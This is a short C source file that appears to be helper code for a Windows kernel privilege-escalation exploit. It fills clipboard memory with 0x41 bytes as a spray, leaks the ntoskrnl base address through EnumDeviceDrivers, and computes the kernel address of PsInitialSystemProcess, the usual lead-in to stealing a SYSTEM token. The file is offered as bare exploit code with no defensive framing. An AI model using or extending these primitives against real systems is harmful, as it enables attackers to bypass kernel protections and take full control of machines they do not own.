#include "base.h"

VOID ShowError(char *str, DWORD dwErrorCode)
{
	printf("%s Error 0x%X\n", str, dwErrorCode);
}

BOOL CreateClipboard(DWORD dwSize)
{
	BOOL bRet = TRUE;
	PCHAR pBuffer = NULL;
	HGLOBAL hMem = NULL;

	pBuffer = (PCHAR)malloc(dwSize);
	if (!pBuffer)
	{
		ShowError("malloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	ZeroMemory(pBuffer, dwSize);
	FillMemory(pBuffer, dwSize, 0x41);

	hMem = GlobalAlloc(GMEM_MOVEABLE, dwSize);
	if (hMem == NULL)
	{
		ShowError("GlobalAlloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	CopyMemory(GlobalLock(hMem), pBuffer, dwSize);

	GlobalUnlock(hMem);

	SetClipboardData(CF_TEXT, hMem);
exit:
	return bRet;
}

ULONG64 GetNTBase()
{
	ULONG64 Base[0x1000];
	DWORD dwRet = 0;
	ULONG64 ulKrnlBase = 0;

	if (EnumDeviceDrivers((LPVOID*)&Base, sizeof(Base), &dwRet))
	{
		ulKrnlBase = Base[0];
	}
	else
	{
		ShowError("EnumDeviceDrivers", GetLastError());
	}

	return ulKrnlBase;
}

ULONG64 GetSystemProcess()
{
	HMODULE hModel = NULL;
	ULONG64 ulAddress = 0, ulOSBase = 0, ulRes = 0;

	ulOSBase = GetNTBase();
	if (ulOSBase == 0)
	{
		goto exit;
	}

	hModel = LoadLibrary("ntoskrnl.exe");
	if (!hModel)
	{
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	ulAddress = (ULONG64)GetProcAddress(hModel, "PsInitialSystemProcess");
	if (!ulAddress)
	{
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	ulRes = ulAddress - (ULONG64)hModel + ulOSBase;

exit:
	return ulRes;
}
